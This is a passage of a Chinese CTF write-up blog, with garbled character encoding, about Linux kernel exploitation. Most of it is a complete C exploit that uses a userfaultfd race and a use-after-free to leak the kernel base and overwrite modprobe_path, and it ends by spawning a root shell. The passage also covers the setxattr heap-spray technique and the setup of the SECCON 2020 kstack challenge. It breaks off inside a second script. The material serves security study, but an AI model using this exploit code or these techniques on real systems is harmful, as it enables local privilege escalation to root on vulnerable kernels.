class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> size;</span><br><span class="line">        <span class="keyword">size_t</span> idx;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> size)</span></span>&#123;</span><br><span class="line">    Chunk chunk=&#123;</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x1337</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    Chunk chunk =&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .data=data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x2333</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    Chunk chunk=&#123;</span><br><span class="line">        .idx=idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    Chunk chunk =&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .data=data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x8888</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> knote_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tty_fd=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_tty_struct_data</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    del(knote_fd,<span class="number">0</span>);</span><br><span class="line">    tty_fd=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!tty_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;/dev/ptmx open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] ptmx ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> modprobe_path_addr=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_modprobe_path</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] object_next changeing&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    del(knote_fd,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] debug: %p\n&quot;</span>,debug);</span><br><span class="line">    <span class="keyword">char</span> get_flag[]=<span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/getshell&quot;</span>,O_RDWR|O_CREAT);</span><br><span class="line">    write(fd,get_flag,<span class="keyword">sizeof</span>(get_flag));</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    <span class="keyword">char</span> *ptr1=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *ptr2=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">0</span>,page_size);</span><br><span class="line"></span><br><span class="line">    registerUserFaultFd(ptr1,page_size,fault_handler_thread);</span><br><span class="line">    registerUserFaultFd(ptr2,page_size,fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    knote_fd=open(<span class="string">&quot;/dev/knote&quot;</span>,O_RDWR);</span><br><span class="line">    add(knote_fd,tty_struct_size);</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,get_tty_struct_data,<span class="number">0</span>);</span><br><span class="line">    get(knote_fd,<span class="number">0</span>,ptr1);</span><br><span class="line">    <span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(*((<span class="keyword">size_t</span>*)(ptr1) + <span class="number">86</span>))&#123;</span><br><span class="line">        kernel_base=*((<span class="keyword">size_t</span>*)(ptr1) + <span class="number">86</span>)<span class="number">-0x5d4ef0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] kernel_base:%p\n&quot;</span>,kernel_base);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        errExit(<span class="string">&quot;[\033[34m\033[1m*\033[0m] get kernel_base fail\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modprobe_path_addr=kernel_base+modprobe_path_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] modprobe_path_addr:%p\n&quot;</span>,modprobe_path_addr);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page,&amp;modprobe_path_addr, <span class="number">8</span>);</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_modprobe_path,<span class="number">0</span>);</span><br><span class="line">    edit(knote_fd,<span class="number">0</span>,ptr2);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    edit(knote_fd,<span class="number">1</span>,<span class="string">&quot;/getshell&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> flag_fd=open(<span class="string">&quot;/flag&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!flag_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;[\033[34m\033[1m*\033[0m] hack fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(flag_fd,flag,<span class="number">0x20</span>);</span><br><span class="line">    write(<span class="number">1</span>,flag,<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡å¦‚æ¶æ„è„šæœ¬æ˜¯<code>cat /flag</code>åœ¨ç»ˆç«¯æ˜¯æ²¡æœ‰æ˜¾ç¤ºçš„ï¼Œå¯èƒ½æœ€åæ‰§è¡Œ<code>call_usermodehelper_exec()</code>çš„æ—¶å€™å¯¹åº”çš„ç»ˆç«¯å·²ç»ä¸æ˜¯å½“å‰ç»ˆç«¯äº†ï¼Œæ‰€ä»¥å¾—æ‰§è¡Œ<code>chmod 777 flag</code>ç„¶åå†è¯»æ‰èƒ½å¾—åˆ°flag.</p>
<p><strong>ç»“æœ</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/fake: line 1: ï¿½ï¿½ï¿½ï¿½: not found</span><br><span class="line">[*] flag&#123;12345&#125;</span><br><span class="line">ok</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">/ $ ls -l flag</span></span><br><span class="line"><span class="string">-rwxrwxrwx    1 0        0               16 Jul 26 08:41 flag</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p><strong>æ€»ç»“</strong></p>
<p>é€šè¿‡è¿™ä¸€é“é¢˜å¤§æ¦‚äº†äº†è§£äº†userfaultfdå’Œmodprobe_pathçš„æ€è·¯å’ŒåŸºæœ¬ç”¨æ³•ï¼Œæ”¶è·æ»¡æ»¡ã€‚</p>
<h2 id="setxattr-userfaultfdå †å ä½"><a href="#setxattr-userfaultfdå †å ä½" class="headerlink" title="setxattr+userfaultfdå †å ä½"></a>setxattr+userfaultfdå †å ä½</h2><p>å’Œsendmsgä¸€æ ·éƒ½æ˜¯å †å–·ï¼Œä¸åŒçš„æ˜¯è¿™ä¸ªå †å†…æ ¸å †çš„å¤§å°æ²¡æœ‰é™åˆ¶ï¼Œè€Œsendmsgç”³è¯·çš„å†…æ ¸å †çš„æœ€å°å­—èŠ‚æ˜¯44ï¼Œæ‰€ä»¥æ¯”èµ·sendmsgæ¥è¯´è¿™ä¸ªæ›´å…·æœ‰ä¸€èˆ¬æ€§ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨<code>setattr()</code>å‡½æ•°ä¸­valueå’Œsizeæˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶ï¼Œå¹¶ä¸”å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„objectå¹¶å†™å…¥ï¼Œä½†è¯¥objectåœ¨setattræ‰§è¡Œç»“æŸä¼šè¢«é‡Šæ”¾ï¼Œè¢«é‡Šæ”¾åæˆ‘ä»¬å°±æ— æ³•æ§åˆ¶è¿™ä¸ªå †äº†ï¼Œä¸è¿‡å¥½åœ¨<code>setattr</code>å‡½æ•°æ˜¯åœ¨kmallocå®Œä¹‹åæ‰æ‰§è¡Œ<code>copy_from_user</code>å‡½æ•°ï¼Œè€Œ<code>user_from_user</code>å‡½æ•°å¯ä»¥é˜»å¡çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆmmapä¸€ä¸ªä¸¤é¡µå¤§å°çš„å†…å­˜ï¼Œç„¶åå‘ç¬¬ä¸€ä¸ªé¡µçš„æœ«å°¾å¡«å……æ•°æ®ï¼Œç¬¬äºŒé¡µå†ç”¨userfaultfdç¼ºé¡µå¤„ç†ï¼Œç„¶åæŠŠç¬¬ä¸€é¡µçš„æœ«å°¾ä¼ å…¥<code>setattr()</code>å‡½æ•°ï¼Œè¿™æ ·copyå®Œç¬¬ä¸€é¡µçš„æœ«å°¾åå†copyç¬¬äºŒé¡µçš„æ—¶å€™å°±ä¼šé™·å…¥ç¼ºé¡µä¸­æ–­äº†ï¼Œç„¶åå°±è¾¾åˆ°äº†chunkæ—¢å¯æ§åˆä¸ä¼šè¢«é‡Šæ”¾çš„ç›®çš„äº†ã€‚</p>
<p><img src="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png" alt="ç›—çš„å›¾"></p>
<h3 id="ä¾‹é¢˜-SECCON-2020-kstack"><a href="#ä¾‹é¢˜-SECCON-2020-kstack" class="headerlink" title="ä¾‹é¢˜ SECCON 2020 kstack"></a>ä¾‹é¢˜ SECCON 2020 kstack</h3><p>qemuå¯åŠ¨è„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -net user -net nic -device e1000 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>

<p>å¼€äº†kaslrå’Œsmepï¼Œä¹Ÿå¼€äº†KPTI</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨è„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt;/dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">insmod /root/kstack.ko</span><br><span class="line">chmod 777 /proc/stack</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">cat /root/banner</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ä¸å¤ªèƒ½æ‰¾åˆ°æ¡ä»¶ç«äº‰çš„æ´ï¼Œå°±æ¯”å¦‚è¿™é“é¢˜ï¼Œæ„Ÿè§‰è¿™ç§æ¡ä»¶ç«äº‰åˆ†æçš„æ—¶å€™å°±å¾—åœ¨å¯ä»¥é˜»å¡çš„ä½ç½®åœä¸‹æ¥ï¼Œæ€è€ƒå¦‚æœè¿™æ—¶å€™é˜»å¡ï¼Œå…¶ä»–çº¿ç¨‹è¿›æ¥ä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Œç„¶åè¿˜æœ‰æ€è€ƒé˜»å¡å‰ç¨‹åºåšäº†ä»€ä¹ˆï¼Œé˜»å¡åç¨‹åºåšäº†ä»€ä¹ˆï¼Œè¿™ä¹ˆä¼šæ¯”è¾ƒå¥½åˆ†æå‡ºæ¡ä»¶ç«äº‰å¦‚ä½•åˆ©ç”¨ï¼Œé€šè¿‡è¿™é“é¢˜è¿˜å­¦åˆ°äº†ä¸¤æ‰‹ï¼Œä¸€æ‰‹æ˜¯åœ¨é˜»å¡çš„ç©ºçª—æœŸæˆ‘ä»¬æƒ³è¦æ‰§è¡ŒæŸäº›ä»»åŠ¡ï¼Œå¯ä»¥ç›´æ¥æ”¾åœ¨userfaultfdçš„å¤„ç†å‡½æ•°ä¸­ï¼Œè¿™æ ·å¯ä»¥å®Œç¾åˆ©ç”¨ç©ºçª—æœŸï¼Œå¦‚æœéœ€è¦å¹¶å‘çš„è¯ï¼Œå®Œå…¨å¯ä»¥åœ¨å¤„ç†å‡½æ•°ä¸­åˆ›å»ºçº¿ç¨‹ç„¶åä½¿ç”¨waitå‡½æ•°ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å…¨éƒ¨ç»“æŸè¿è¡Œç„¶åå†å»å¤„ç†ç¼ºé¡µï¼ŒäºŒæ‰‹æ˜¯åŸæ¥å†…æ ¸ä¹Ÿå¯ä»¥doublefree,è¿™é“é¢˜çš„åˆ©ç”¨å°±æ˜¯å…ˆdoublefreeä¸€ä¸ª0x20çš„å †ï¼Œç„¶åæ‰“å¼€ä¸€ä¸ªstatç”³è¯·ä¸€ä¸ª0x20çš„seq_operationï¼Œæ­¤æ—¶ä¸‹æ¬¡ç”³è¯·ä¸€ä¸ª0x20çš„å †è¿˜æ˜¯ä¼šç”³è¯·åˆ°seq_opsrationï¼Œä¹Ÿå°±èƒ½æ”¹seq_operationçš„startæŒ‡é’ˆäº†ï¼Œæœ€åä½¿ç”¨ä¸€ä¸ª<code>add rsp,xxx</code>çš„gadgetè¿ç§»åˆ°<strong>pt_regs</strong>ä¸Šè¿›è¡Œrop.</p>
<h4 id="è„šæœ¬-2"><a href="#è„šæœ¬-2" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span 